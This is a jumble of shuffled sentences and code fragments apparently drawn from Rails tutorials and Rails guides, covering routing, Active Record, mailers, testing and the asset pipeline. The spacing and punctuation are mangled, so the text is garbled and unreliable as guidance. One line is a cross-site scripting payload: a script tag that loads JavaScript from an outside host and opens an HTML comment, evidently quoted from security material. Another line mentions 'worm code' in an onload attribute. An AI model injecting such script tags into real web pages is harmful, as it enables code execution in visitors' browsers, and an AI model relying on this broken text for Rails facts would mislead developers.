* The `config ▖ assets ▖ compress` option should be changed to `config ▖ assets ▖ js _ compressor` like so for instance :
\ href { https : / / www ▖ udemy ▖ com / learn-test-driven-development-in-ruby / couponCode = hartl } { Bala Paranj &apos;s Test Driven Development in Ruby } : A more advanced online course focusing on TDD in pure Ruby
In the application code , the \ kode { following ? } \ method takes in a user , called \ kode { other \ _ user } , and checks to see if a followed user with that id exists in the database ; the \ kode { follow ! } \ method calls \ kode { create ! } \ through the \ kode { relationships } association to create the following relationship .
in Listing ~ \ ref { code : layout _ signin _ signout _ links } .
The `find _ by _ sql` method will return an array of objects even if the underlying query returns just a single record ▖
The meaning of the prefix column ( and other columns ) ╼ will be seen later , but for now notice that Rails has inferred the ╼ singular form `article` and makes meaningful use of the distinction .
The inheritance hierarchy for the Static Pages .
&lt; script src = http : / / www ▖ securitylab ▖ ru / test / sc ▖ js &gt; &lt; / script &gt; &lt; ! --
Replace \ kode { &quot; subl -w &quot; } with \ kode { &quot; mate -w &quot; } for TextMate , \ kode { &quot; gvim -f &quot; } for gVim , or \ kode { &quot; mvim -f &quot; } for MacVim .
With something as dangerous as destroying users , it &apos;s important to have good tests for the expected behavior .
Index action with edit link &#93; ( images / getting _ started / index _ action _ with _ edit _ link ▖ png )
# = &gt; 302 ▖ 24399 %
# Find the client with primary key ( id ) 10 .
objects do not even respond to `blank ? ` ▖
user-microposts
Return the User object associated with the micropost .
A mockup of the user followers page ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / followers _ mockup _ bootstrap-full ▖ png } { ( full size ) }
Since we have no need to show or edit sessions , we &apos;ve restricted the actions to \ kode { new } , \ kode { create } , and \ kode { destroy } using the \ kode { : only } option accepted by \ kode { resources } .
The date and time is &lt; % = Time ▖ now % &gt; &lt; / p &gt;
d ▖ beginning _ of _ year # = &gt; Fri , 01 Jan 2010
For example , to open the sample app in Sublime Text , you type
# Expands the lines which load the assets
Install Git
This line will mount the engine at ` / blog` in the application ▖
config ▖ assets ▖ compress = false
You can also disable generation of controller specific asset files by adding the ╼ following to your `config / application ▖ rb` configuration :
( I don &apos;t know which is cooler : that Ruby lets you add methods to built-in classes , or that \ kode { &quot; deified &quot; } is a palindrome ▖ )
You can either open a pull request to &#91; Rails &#93; ( http : / / github ▖ com / rails / rails ) or ╼ ask the &#91; Rails core team &#93; ( http : / / rubyonrails ▖ org / core ) for commit access on
In other words , \ kode { object : f ▖ object } creates a variable called \ kode { object } in the \ kode { error \ _ messages } partial .
delete a session ( sign out )
Tests for the named routes .
Rails uses the standard file \ kode { db / seeds ▖ rb } to seed the database with sample data using \ kode { rake db : seed } .
The \ kode { presence : true } argument is a one-element \ emph { options hash } ; recall from Section ~ \ ref { sec : css _ revisited } that curly braces are optional when passing hashes as the final argument in a method .
gem &apos; rails &apos; , &apos; 3 ▖ 1 ▖ 12&apos;
process _ without _ stringified _ params ( action , params , session , flash , http _ method )
A test implementing the above steps appears in Listing ~ \ ref { code : flash _ persistence _ test } .
This is a first important step toward allowing users to register for our site ; we &apos;ll take the next step , modeling users , in Chapter ~ \ ref { cha : modeling _ users } , and we &apos;ll finish the job in Chapter ~ \ ref { cha : sign _ up } .
/ users
today ?
Now that our login form can handle invalid submissions , the next step is to handle valid submissions correctly by actually logging a user in .
This method determines if a given password is valid for a particular user by computing its digest and comparing the result to \ kode { password \ _ digest } in the database .
When you confirm the overwriting of the `config / database ▖ yml` file , your application will be configured for MySQL instead of SQLite ▖
delegate : name , to : : profile , allow _ nil : true
For the account activation mailer method , they appear as in Listing ~ \ ref { code : generated _ account _ activation _ view _ text } and Listing ~ \ ref { code : generated _ account _ activation _ view _ html } .
( The key \ kode { : success } is a symbol , but embedded Ruby automatically converts it to the string \ kode { &quot; success &quot; } before inserting it into the template ▖ )
( You will have to create both the \ kode { spec / helpers } directory and the \ kode { application \ _ helper \ _ spec ▖ rb } file ▖ )
Together with the natural-language syntax provided by Capybara , integration tests provide a powerful method to test our application &apos;s functionality without having to manually check each page with a browser .
ActiveSupport : : JSON : : Encoding ▖ time _ precision = 0
# = &gt; Thu , 01 Jul 2010 00 : 00 : 00 UTC + 00 : 00 ▖ .
( Listing ~ \ ref { code : followers _ test } might have used a \ kode { followed \ _ by ? } \ method to complement the \ kode { following ? } \ method , but it turns out we won &apos;t need it in our application ▖ )
When you set up a regular route , you supply a series of symbols that Rails maps to parts of an incoming HTTP request ▖
= &gt; # &lt; User id : nil , name : nil , email : nil , created _ at : nil , updated _ at : nil &gt;
The Home page ( \ href { http : / / localhost : 3000 / static _ pages / home } { / static \ _ pages / home } ) with an added footer ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / site _ with _ footer _ bootstrap _ 4 _ 0-full ▖ png } { ( full size ) }
To avoid needless repetition , we &apos;ll write a helper method called \ kode { log \ _ in \ _ as } to log in for us .
% w ( a b c d ) ▖ append ( &apos; e &apos; ) # = &gt; % w ( a b c d e )
WARNING ▖ Note that some databases are configured to perform case-insensitive ╼ searches anyway .
Note here the use of \ kode { before ( : all ) } , which ensures that the sample users are created \ emph { once } , before all the tests in the block .
In database terms , this association says that the other class contains the foreign key ▖
You will want to rescue this exception instead of the low-level `MultiJson : : DecodeError` , for example .
# # # # # `extending`
You don &apos;t need to tell it any more than ╼ this .
Mailing the password reset link .
Client ▖ where ( first _ name : &apos; Ryan &apos; ) ▖ count
It &apos;s convenient to use the \ kode { full \ _ title } helper in the tests by including the Application helper into the test helper , as shown in Listing ~ \ ref { code : test _ helper _ application _ helper } .
Check your CDN documentation for any additional information they may provide ╼ such as `X-Cache` or for any additional headers they may add .
For cases such as the one in this chapter , the advantage over Active Record may not be obvious , but we &apos;ll use more advanced features of factories in future chapters .
Next , we &apos;ll add validations for the micropost &apos;s \ kode { content } attribute ( following the example from Section ~ \ ref { sec : putting _ the _ micro _ in _ microposts } ) .
To configure our application to use SendGrid , we need to fill out the \ href { https : / / en ▖ wikipedia ▖ org / wiki / Simple _ Mail _ Transfer _ Protocol } { SMTP } settings for our production environment .
&lt; % = image _ tag &quot; home ▖ gif &quot; , alt : &quot; Home &quot; % &gt;
= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
Both of these nesting techniques apply to the footer CSS in Listing ~ \ ref { code : footer _ css } , which can be transformed into the following :
and so on for the other pages .
# # # Configuring Action Mailer
Putting an index on the email column fixes the problem .
With that , all we have left is to initialize the Git repository
&#124; PATCH / PUT &#124; / magazines / : magazine _ id / ads / : id &#124; ads # update &#124; update a specific ad belonging to a specific magazine &#124;
This will find all clients where the `orders _ count` field &apos;s value is 2 .
create test / models / blorgh / comment _ test ▖ rb
With the call to `extract _ options ! ` you obtain the options hash and remove it from `actions` in a simple and explicit way .
# ActiveSupport ▖ on _ load ( : active _ record ) do
43 , 44 , 45 , 46 , 47 , 48 , 49 , 50 , 51 &#93;
through : : orders
&lt; form action = &quot; / people / create &quot; method = &quot; post &quot; &gt;
options = options ▖ stringify _ keys
before _ save : set _ author
NoMethodError : undefined method `split &apos; for : name : Symbol
This means that you will be able to generate new controllers and models for this ╼ engine very easily by running commands like this :
scope &apos; / admin &apos; do
Now that new users can sign up for our site ( Chapter ~ \ ref { cha : sign _ up } ) , it &apos;s time to give them the ability to log in and log out .
The method `missing _ name ? ` provides a way to distinguish both cases :
They &apos;ve been trained that whenever they try to install something , or even fill out a form online , it &apos;s not going to work .
If you want to send emails right away ( from a cronjob for example ) just call ╼ `deliver _ now` :
The User model for the demo application .
&lt; % = image _ tag &quot; rails ▖ png &quot; % &gt;
This is ╼ another part of capturing the hierarchical relationship that exists between ╼ articles and comments .
A common pattern for using a CDN is to set your production application as the ╼ &quot; origin &quot; server ▖
You will \ href { http : / / stackoverflow ▖ com / questions / 6714196 / ruby-url-encoding-string } { find two main possibilities } , \ kode { URI : : encode ( str ) } and \ kode { CGI : : escape ( str ) } .
We &apos;ll also add an associated \ kode { following ? } \ boolean method to test if one user is following another
As a prerequisite , OS ~ X users may need to install the Xcode developer tools .
* `eager _ load ! ` If `config ▖ eager _ load` is true , runs the `config ▖ before _ eager _ load` hooks and then calls `eager _ load ! ` which will load all `config ▖ eager _ load _ namespaces` .
As a final step , we &apos;ll see how to make staying logged in optional using a ``remember me &apos; &apos; checkbox .
# # # # # `collection ▖ size`
use ActiveRecord : : QueryCache
Each test simply gets an action and verifies ( via an \ emph { assertion } ) that the result is a success .
The `app / views / users / _ user ▖ html ▖ erb` partial contains the following :
Another technique related to models involves undoing \ emph { migrations } , which we saw briefly in Chapter ~ \ ref { cha : a _ demo _ app } and will see much more of starting in Chapter ~ \ ref { cha : modeling _ users } .
Used internally by `image _ tag` to build the image path .
Start users in an ``unactivated &apos; &apos; state .
There may be an instance where an internal public method wasn &apos;t given a ` : nodoc : ` by mistake , for example when switching a method from private to public visibility ▖
As you might expect , we use the \ kode { find } method on the User model ( Section ~ \ ref { sec : finding _ user _ objects } ) to retrieve the user from the database , as shown in Listing ~ \ ref { code : user _ show _ action } .
next _ year
Assuming ` @ products` is a collection of `Product` instances , you can simply write the following to produce the same result :
Write a test to make sure that friendly forwarding only forwards to the given URL the first time .
at least one word character , plus , hyphen , or dot
To verify the behavior of the ``remember me &apos; &apos; checkbox , we &apos;ll write two tests , one each for submitting with and without the checkbox checked .
( By the way , as a preview of Ruby &apos;s compact awesomeness , here &apos;s the code I used to generate the random subdomains :
Generally , a feature is anything that adds new behavior , while a bug is ╼ anything that fixes already existing behavior that is misbehaving ▖
With the asset pipeline , we don &apos;t have to choose between speed and convenience :
load &apos; deploy / assets&apos;
add _ header ETag &quot; &quot; ;
t ▖ string : title
Apart from the site footer , which we &apos;ll add in Section ~ \ ref { sec : partials } , our layout is now complete , and we can look at the results by visiting the Home page .
The method `next _ week` receives a symbol with a day name in English ( default is the thread local `Date ▖ beginning _ of _ week` , or `config ▖ beginning _ of _ week` , or ` : monday` ) and it returns the date corresponding to that day .
in Listing ~ \ ref { code : layout _ signin _ signout _ links } and
If you feel overwhelmed , you can always go back and start with one of the resources listed below .
So , where does the pattern come from ?
For example , it makes more sense to say that a supplier owns an account than that an account owns a supplier ▖
( Right now , of course , they &apos;ll be accepted because all non-blank email addresses are currently valid ▖ )
This will define a `user _ path` method that will be available in controllers , helpers and views that will go to a route such as ` / bob` ▖
Then we &apos;ll make a listing of all users ( also requiring authentication ) , which will motivate the introduction of sample data and pagination .
* To re-enable the old finders , you can use the &#91; activerecord-deprecated _ finders gem &#93; ( https : / / github ▖ com / rails / activerecord-deprecated _ finders ) .
RESTful routes provided by the Users resource in Listing ~ \ ref { code : users _ resource } .
Thanks to reader \ href { https : / / twitter ▖ com / colmtuite } { Colm Tuite } for his excellent work in helping to convert the sample application over to Bootstrap .
Comparing Listing ~ \ ref { code : demo _ user _ class } and Listing ~ \ ref { code : demo _ micropost _ class } , we see that both the User model and the Micropost model inherit ( via the left angle bracket ~ \ kode { &lt; } ) from \ kode { ActiveRecord : : Base } , which is the base class for models provided by ActiveRecord ; a diagram summarizing this relationship appears in Figure ~ \ ref { fig : demo _ model _ inheritance } .
This reloads the \ kode { user } variable from the test database using \ kode { user ▖ reload } , and then verifies that the user &apos;s new name and email match the new values .
This means that if someone requests an asset that does ╼ not exist ` / assets / i-dont-exist ▖ png` and your Rails application returns a 404 , ╼ then your CDN will likely cache the 404 page if a valid `Cache-Control` header ╼ is present .
That &apos;s fine , the helper module is not mandatory so Rails silences a load error ▖
Add tests for the sidebar micropost count ( including proper pluralization ) .
Accepts a container ( hash , array , enumerable , your type ) and returns a string of option tags .
A preliminary implementation for the micropost status feed .
Although the command line may seem primitive to users mainly familiar with graphical user interfaces ( GUIs ) , appearances are deceiving : the command line is one of the most powerful tools in the developer &apos;s toolbox .
A test for forwarding to the default page after friendly forwarding .
&#124; ` { &quot; person &quot; : &#91; null , null , ▖ ▖ ▖ &#93; } ` &#124; ` { : person = &gt; nil } ` &#124;
In this section , we &apos;ll implement a security model that requires users to be signed in and prevents them from updating any information other than their own .
= &gt; &quot; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
t = Time ▖ local ( 2010 , 5 , 8 ) # = &gt; Sat , 08 May 2010
Taken together , the material in Chapter ~ \ ref { cha : modeling _ users } through Chapter ~ \ ref { cha : password _ reset } develops a full Rails login and authentication system .
format ▖ text
The resulting Rails Tutorial Cloud9 workspace comes pre-configured with most of the software needed for professional-grade Rails development , including Ruby , RubyGems , Git .
# # # # benchmark
The site layout with the \ kode { full \ _ title } helper ▖
The About page with HTML structure removed ▖
Finally , we &apos;ll put the toy app under version control with Git :
The view converts its contents to HTML ( Step ~ 7 ) , which is then returned by the controller to the browser for display ( Step ~ 8 ) .
We could fix the problem by putting \ kode { root \ _ url } in parentheses , but the idiomatically correct way to do it is to use \ kode { and } instead .
Note that , while the \ kode { each } method for arrays takes a block with only one variable , \ kode { each } for hashes takes two , a \ emph { key } and a \ emph { value } .
Rails understands both numeric status codes and the corresponding symbols shown below .
umerate } ╼ ╼ % subsection the _ form _ html ( end ) ╼ ╼ \ section { Unsuccessful signups } % ( fold ) ╼ \ label { sec : unsuccessful _ signups } ╼ ╼
The default error message is _ &quot; is invalid &quot; _ .
If you are using Rails with the &quot; Asset Pipeline &quot; enabled , this helper will generate a link to ` / assets / stylesheets / ` ▖
The first practical application of logging in involves changing the layout links based on login status .
We &apos;re now ready to commit the changes on our topic branch and merge back to master :
In Chapter ~ \ ref { cha : sign _ up } , we &apos;ll give users the ability to sign up for our site and create a user profile page .
The root directory for any given app is known as the \ emph { Rails root } , but this terminology is confusing and many people mistakenly believe that the ``Rails root &apos; &apos; is the root directory for Rails itself .
Also converts &quot; : : &quot; back to &quot; / &quot; :
charset : &quot; UTF-8 &quot; ,
* `proxy _ association ▖ target` returns the associated object for `belongs _ to` or `has _ one` , or the collection of associated objects for `has _ many` or `has _ and _ belongs _ to _ many` .
Conditional Validation
The activation email will involve a URL of the form
Note the inclusion of
Happily , though , we &apos;ve done a good job of giving our HTML elements sensible classes , which puts us in a great position to add style to the site with CSS .
page to show user with id \ texttt { 1 }
It gives you the class name corresponding to a table name :
If you thought , &quot; this method looks like a public class method for `ActiveRecord : : Core` &quot; , you were right ▖
The filter is applied only once , however , so the onload attribute with the worm code stays in place ▖
There exists shorthand syntax to achieve just that , via the ` : shallow` option :
returns \ kode { &quot; 0 errors &quot; } , \ kode { &quot; 1 error &quot; } , \ kode { &quot; 2 errors &quot; } , and so on , depending on how many errors there are , thereby avoiding ungrammatical phrases such as \ kode { &quot; 1 errors &quot; } ( a distressingly common mistake on \ href { http : / / www ▖ urbandictionary ▖ com / define ▖ php ? term = interwebs } { teh interwebs } ) .
Alert readers might note at this point that the code in Listing ~ \ ref { code : proto _ status _ feed } is essentially equivalent to writing
Note the compact redirect
# # # Listing all articles
For example , to send newsletters only to users with the primary key starting from 2000 , and to retrieve them in batches of 5000 :
We discovered in Section ~ \ ref { sec : uniqueness _ validation } that we needed to delete the default fixtures so that our email uniqueness tests would pass ( Listing ~ \ ref { code : empty _ fixtures } ) .
would assemble an array using the \ kode { followed \ _ id } in the \ kode { relationships } table .
We &apos;ve also omitted the leading \ kode { Micropost ▖ } \ since we expect this method to live in the Micropost model itself ▖ )
Here the \ kode { errors ▖ full \ _ messages } object ( which we saw briefly before in Section ~ \ ref { sec : presence _ validation } ) contains an array of error messages .
Test-driven development uses a ``Red , Green , Refactor &apos; &apos; cycle .
To install Rails , use the `gem install` command provided by RubyGems :
# # # JavaScriptHelper
The results appear in Listing ~ \ ref { code : annotated _ user _ model } .
This generator will provide the same ╼ skeleton structure as would the `--full` option ▖
update
A configuration file for \ href { http : / / rack ▖ github ▖ io / } { Rack middleware }
The `presence` method returns its receiver if `present ? ` , and `nil` otherwise ▖
Some contributors to Rails have email notifications from GitHub turned on , but ╼ others do not ▖
By default , files are loaded from `public / images` .
The \ kode { alt } attribute is what will be displayed if there is no image , and it is also what will be displayed by screen readers for the visually impaired .
Some uses of \ kode { assert \ _ select } .
This only works if the external email server is configured for immediate delivery .
create app / mailers / user _ mailer ▖ rb
# &lt; git-show nil = &quot; true &quot; &gt; &lt; / git-show &gt;
You shouldn &apos;t use instance methods since it &apos;s now deprecated ▖
A user row in the SQLite database \ kode { db / development ▖ sqlite3 } .
@ customer ▖ orders ▖ destroy ( @ order1 )
The resulting HTML and text emails appear as in Figure ~ \ ref { fig : account _ activation _ html _ preview } and Figure ~ \ ref { fig : account _ activation _ text _ preview } .
becomes
As it happens , the sample application created in this tutorial is safe for exposure on the web , but it is dangerous to rely on this fact in general .
( We saw an example of this class in Listing ~ \ ref { code : signup _ button } ▖ )
Thus , you may want to consider removing the first two apps before proceeding , which you can do by navigating to the \ kode { workspace } directory and running \ kode { rm -rf hello \ _ app / toy \ _ app / } ( Table ~ \ ref { table : unix _ commands } ) .
# ▖ ▖ ▖ .
exercise &apos; id = &apos; ex-c6f975 &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ % subsection sample _ microposts ( end ) ╼ ╼ \ subsection { Profile micropost tests } % ( fold ) ╼ \ label { sec : profile _ micropost _ tests } ╼ ╼
WHERE ( addresses ▖ client _ id IN ( 1,2,3,4,5,6,7,8,9,10 ) )
* FROM &quot; users &quot; INNER JOIN &quot; articles &quot; ON &quot; articles &quot; ▖ &quot; user _ id &quot; = &quot; users &quot; ▖ &quot; id &quot; WHERE &quot; users &quot; ▖ &quot; id &quot; = 1
The tutorial &apos;s code examples are not in isolation .
Name : &lt; % = person ▖ name % &gt; &lt; br &gt;
Returns the User object associated with the micropost
&quot; One of the strings is empty &quot;
order _ number : &quot; A12345 &quot; )
We &apos;ll first write some simple tests , which generally follow the examples from the User model validation tests in Section ~ \ ref { sec : user _ validations } , as shown in Listing ~ \ ref { code : micropost _ validations _ tests } .
This arranges to skip the \ texttt { pg } gem for PostgreSQL in development and use SQLite for development and testing .
With the code as in Listing ~ \ ref { code : db _ seed } , we can reset the database and then invoke the Rake task using \ kode { db : seed }
In fact , a Rails ╼ application &apos;s functionality is actually a superset of what is provided by ╼ engines !
With this declaration , the `product` layout would be used for everything but the `rss` and `index` methods .
Putting together the discussion above yields the User model shown in Listing ~ \ ref { code : before _ create _ activation _ digest } .
By default , `Model ▖ find` selects all the fields from the result set using `select * ` .
calls the \ kode { stylesheet \ _ link \ _ tag } function with two arguments : a string , indicating the path to the stylesheet , and a hash with two elements , indicating the media type and telling Rails to use the \ href { https : / / github ▖ com / rails / turbolinks } { turbolinks } feature added in Rails ~ 4 ▖ 0 .
$ bundle exec rake test ╼ ActionController : : UrlGenerationError : ╼ No route matches { : action = &gt; &quot; about &quot; , : controller = &gt; &quot; static _ pages &quot; }
in Listing ~ \ ref { code : micropost _ create _ image _ upload } .
&quot; Date &quot; = &gt; &quot; date &quot; ,
We see there is an empty response ( no data after the `Cache-Control` line ) , but the request was successful because Rails has set the response to 200 OK ▖ You can set the ` : status` option on render to change this response ▖
To see how it works , we just need to add a line consisting of \ kode { debugger } to our application , as shown in Listing ~ \ ref { code : debugger } .
$ bin / rails g migration add _ author _ id _ to _ blorgh _ articles author _ id : integer
There are as many choices for a user data model as there are different registration forms on the web ; we &apos;ll go with a distinctly minimalist approach .
@ number ▖ next
# # # # # `offset`
Rails also adapts rapidly to new developments in web technology and \ linebreak framework design .
# equivalent to Time ▖ current ▖ advance ( years : 2 )
person = Person ▖ create ( name : &apos; John &apos; )
Once you &apos;ve watched the relevant RailsCast to get a basic idea of how to proceed , I suggest writing the new feature using test-driven development .
`app / mailers / user _ mailer ▖ rb` contains an empty mailer :
* `increment !
If you look at the options of the application generator , you will see that one of the options is named `--database` ▖
date ▖ ago ( 1 ) # = &gt; Thu , 10 Jun 2010 23 : 59 : 59 EDT -04 : 00
as shown in Listing ~ \ ref { code : micropost _ validations _ tests } .
p ▖ save # = &gt; false
/ / = require _ tree .
* How to use localized views .
All that is needed to complete the authentication functionality is to restrict access to pages based on signin status and user identity .
Note that we &apos;ve written
The above returns `true` if there is at least one client with the `first _ name` &apos; Ryan &apos; and `false` ╼ otherwise .
In all of these methods , `collection` is replaced with the symbol passed as the first argument to `has _ and _ belongs _ to _ many` , and `collection _ singular` is replaced with the singularized version of that symbol ▖
&apos;X-XSS-Protection &apos; = &gt; &apos; 1 ; mode = block &apos; ,
Mailers are conceptually similar to controllers , and so we get a mailer , ╼ a directory for views , and a test .
customer _ name : &quot; John Doe &quot; )
Moreover , this subset is \ emph { different } from the usual approaches to learning Ruby , which is why , if your goal is making dynamic web applications , I recommend learning Rails first , picking up bits of Ruby along the way .
For example you could run this query :
class FooBar
app
The SQL looks like :
To do that you introduced a &quot; referer &quot; field in a form to redirect to the given address :
╼ $ bundle exec rake db : migrate RAILS _ ENV = production
The results appear in Listing ~ \ ref { code : pretty _ page _ tests } .
To see information about our first application , click on the link ``About your application &apos;s environment &apos; &apos; .
( I include the last line just to demonstrate how to exit the console , and on most systems you can Ctrl-d for the same purpose ▖ )
To get started with static pages , we &apos;ll first generate a controller using the same Rails \ kode { generate } script we used in Chapter ~ \ ref { cha : a _ toy _ app } to generate scaffolding .
Rails provides the `rails : update` rake task ▖
To select only a subset of fields from the result set , you can specify the subset via the `select` method .
The result of a successful edit .
* The &#91; Ruby on Rails mailing list &#93; ( http : / / groups ▖ google ▖ com / group / rubyonrails-talk )
Creates an active relationship associated with \ kode { user }
( \ emph { Hint } : What if a user is following 5000 other users ? )
To learn how to do things like this , you can do what I did : Google around for things like ``javascript maximum file size &apos; &apos; until you find something on Stack Overflow .
( If you &apos;re using the cloud IDE , be sure to open the resulting development server in a new \ emph { browser } tab , not inside the IDE itself ▖ )
This relies on the definition of a page title ( using \ kode { provide } ) in each view , as in
Of course , to create enough users to make a decent user index , we \ emph { could } use our web browser to visit the signup page and make the new users one by one , but far a better solution is to use Ruby ( and Rake ) to make the users for us .
= &gt; nil
as shown in Listing ~ \ ref { code : microposts _ create _ action _ with _ feed } .
* How to use GitHub to report issues .
This part is not used in any assemblies
If you want to find both by name and locked , you can chain these finders together by simply typing &quot; `and` &quot; between the fields ▖
The full status feed builds on the proto-feed from Section ~ \ ref { sec : a _ proto _ feed } by assembling an array of the microposts from the users being followed by the current user , along with the current user &apos;s own microposts .
As of this writing , \ href { http : / / www ▖ sublimetext ▖ com / 3 } { Sublime Text ~ 3 } is in beta .
There is also a ` : case _ sensitive` option that you can use to define whether the ╼ uniqueness constraint will be case sensitive or not ▖
content _ type : &quot; text / html &quot; ,
# Defaults to Rails ▖ root ▖ join ( &quot; public / assets &quot; )
$ bundle install
Therefore the file should be called `articles / new ▖ html ▖ erb` and needs ╼ to be located inside the `app / views` directory of the application .
A test for the new user page ▖
As we proceed , it may help to refer to Table ~ \ ref { table : user _ urls } , which shows the correspondence between pages and URLs .
Finally , we &apos;ll put the demo app under version control .
Then it joins the result with &quot; &amp; &quot; :
No conflicts ?
This can be important when you declare Active Record models within a module ▖
Ruby on Rails Tutorial
nt prerequisites ( especially \ ler , \ les , and \ lera ) ▖ ╼ ╼ \ section { Showing users } % ( fold ) ╼ \ label { sec : showing _ users } ╼ ╼
orders &lt; &lt; ( object , ▖ ▖ ▖ )
= &gt; &quot; aaaaaaaaaa &quot;
\ kode { vendor / assets } : assets from third-party vendors
We saw an example of this method in Section ~ \ ref { sec : blocks } ; as another example , we &apos;ll use \ kode { map } to convert an array of integers to an array of strings :
$ git push mine my _ new _ branch
The method must be public in the target .
element ▖ style ▖ backgroundColor = backgroundColor
class Parts &lt; ActiveRecord : : Base
class Supplier &lt; ActiveRecord : : Base
A direct test the \ kode { full \ _ title } helper .
Fix this problem by writing a direct test of the \ kode { full \ _ title } helper , which involves creating a file to test the application helper and then filling in the code indicated with \ kode { FILL \ _ IN } in Listing ~ \ ref { code : full _ title _ helper _ tests } .
When debug mode is off , Sprockets concatenates and runs the necessary ╼ preprocessors on all files ▖
Finally , we &apos;ll add the files in your new Rails project to Git and then commit the results .
* How to configure Action Mailer for your environment .
In that case , the application will only load what the framework itself cherry-picks for its own needs , and can still cherry-pick itself at any granularity level , as explained in the previous section .
The `has _ and _ belongs _ to _ many` association creates a many-to-many relationship with another model ▖
If you frequently retrieve customers directly from line items ( ` @ line _ item ▖ order ▖ customer` ) , then you can make your code somewhat more efficient by including customers in the association from line items to orders :
# # # # url _ field _ tag
In other words , the first example above could replace \ kode { str } with any other valid variable name , such as \ kode { the \ _ function \ _ argument } , and it would work just the same :
* `set _ routes _ reloader` Configures Action Dispatch to reload the routes file using `ActionDispatch : : Callbacks ▖ to _ prepare` .
gem &apos; sass-rails &apos; , &apos; ~ &gt; 3 ▖ 2 ▖ 6&apos;
( Because the ``Log in &apos; &apos; navigation link hasn &apos;t yet been filled in , you &apos;ll have to type the / login URL directly into your address bar .
In the \ kode { correct \ _ user } before filter , note that we find microposts \ emph { through } the association :
Indeed , updating the follow / unfollow form partials is trivial : just change
# = &gt; &lt; input src = &quot; / images / login ▖ png &quot; type = &quot; image &quot; / &gt;
# # # Rendering a Partial Form
Date ▖ new ( 2012 , 2 , 29 ) ▖ years _ ago ( 3 ) # = &gt; Sat , 28 Feb 2009
Provides functionality for working with JavaScript in your views .
when &apos; Country Manager&apos;
# Don &apos;t fallback to assets pipeline if a precompiled asset is missed
We first saw microposts in larval form in Chapter ~ \ ref { cha : a _ toy _ app } , and in this chapter we will make a full-strength version of the sketch from Section ~ \ ref { sec : microposts _ resource } by constructing the Micropost data model , associating it with the User model using the \ kode { has \ _ many } and \ kode { belongs \ _ to } methods , and then making the forms and partials needed to manipulate and display the results ( including , in Section ~ \ ref { sec : micropost _ images } , uploaded images ) .
By hashing the password with bcrypt , we ensure that an attacker won &apos;t be able to log in to the site even if they manage to obtain a copy of the database .
In any case , the question has now been definitively answered in the affirmative : some of the most heavily trafficked sites in the world use Rails .
A test of the users index , including pagination ▖
This is for the benefit of the Ajax implementation in Section ~ \ ref { sec : a _ working _ follow _ button _ with _ ajax } , which accesses elements on the page using their unique ids .
gem &apos; coffee-rails &apos; , &quot; ~ &gt; 3 ▖ 2 ▖ 1 &quot;
In this context , \ emph { virtual } means that the attributes exist on the model object but do not correspond to columns in the database .
Rails , like most libraries , uses the private keyword from Ruby for defining internal API ▖
In the case of the User model , this leads to the data model shown in Figure ~ \ ref { fig : user _ model _ password _ digest } .
Here are some helpful links to help you learn even more :
Active Support defines `reverse _ merge` in case you prefer this alternative notation :
The data model for microposts .
However , if you follow the conventions adopted by ╼ Rails , you &apos;ll need to write very little configuration ( in some case no ╼ configuration at all ) when creating Active Record models ▖
If a method expects a variable number of arguments and uses ` * ` in its declaration , however , such an options hash ends up being an item of the array of arguments , where it loses its role .
p ▖ name = &quot; Some Book &quot;
The first is to use `create _ with` :
NB : The output may still contain unescaped &apos; &lt; &apos; , &apos; &gt; &apos; , &apos; &amp; &apos; characters and confuse browsers .
Suggested error messages tests .
An empty fixtures file ▖
A profile with an unfollow button and incremented followers count ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / page _ flow _ other _ profile _ unfollow _ button _ mockup _ bootstrap-full ▖ png } { ( full size ) }
and create a dedicated branch :
database : db / development ▖ sqlite3
Here &apos;s the development section :
Likewise , once retrieved an Active Record object can be destroyed which removes ╼ it from the database .
( 1 ▖ ▖ 10 ) = = = ( 3 ▖ ▖ 11 ) # = &gt; false
&#91; Spring README &#93; ( https : / / github ▖ com / rails / spring # rake ) .
get &apos; : controller ( / : action ( / : id ) ) &apos; , controller : / admin \ / &#91; ^ \ / &#93; + /
Barring the improbable scenario of migrations generated the same second , using timestamps conveniently avoids such collisions .
# # # `format`
See the \ href { http : / / sass-lang ▖ com / } { Sass website } for more details .
as shown in Listing ~ \ ref { code : attr _ accessible _ user _ id _ test } .
The follow / unfollow partials themselves are shown in Listing ~ \ ref { code : follow _ form } and Listing ~ \ ref { code : unfollow _ form } .
d ▖ prev _ month # = &gt; Thu , 08 Apr 2010
class Tag &lt; ActiveRecord : : Base
In this chapter , we will complete the sample application by adding a social layer that allows users to follow ( and unfollow ) other users , resulting in each user &apos;s Home page displaying a status feed of the followed users &apos; microposts .
Indeed , the first two editions of this tutorial were hosted for free on Heroku , which served several million requests without charging me a cent .
$ bundle exec rake routes ╼ Prefix Verb URI Pattern Controller # Action ╼ root GET / static _ pages # home ╼ help GET / help ( ▖ : format ) static _ pages # help ╼ about GET / about ( ▖ : format ) static _ pages # about ╼ contact GET / contact ( ▖ : format ) static _ pages # contact ╼ signup GET / signup ( ▖ : format ) users # new ╼ login GET / login ( ▖ : format ) sessions # new ╼ POST / login ( ▖ : format ) sessions # create ╼ logout DELETE / logout ( ▖ : format ) sessions # destroy ╼ users GET / users ( ▖ : format ) users # index ╼ POST / users ( ▖ : format ) users # create ╼ new _ user GET / users / new ( ▖ : format ) users # new ╼ edit _ user GET / users / : id / edit ( ▖ : format ) users # edit ╼ user GET / users / : id ( ▖ : format ) users # show ╼ PATCH / users / : id ( ▖ : format ) users # update ╼ PUT / users / : id ( ▖ : format ) users # update ╼ DELETE / users / : id ( ▖ : format ) users # destroy
# end
By the way , using \ kode { inspect } to print an object is common enough that there &apos;s a shortcut for it , the \ kode { p } function
The `find _ in _ batches` method is similar to `find _ each` , since both retrieve batches of records ▖
This is easy when reading the book as a web page , since you can just use the Back button of your browser , but both Adobe Reader and OS ~ X &apos;s Preview allow you to do this with the PDF as well .
Note that we haven &apos;t restricted the actions the before filter applies to since it applies to them both by default .
Listing ~ \ ref { code : irbrc } arranges to simplify the irb prompt and suppress some annoying auto-indent behavior .
Ruby is setting the \ kode { @ name } variable to \ kode { &quot; Example User &quot; } ( and similarly for the \ kode { email } attribute ) , which we then use in the \ kode { formatted \ _ email } method .
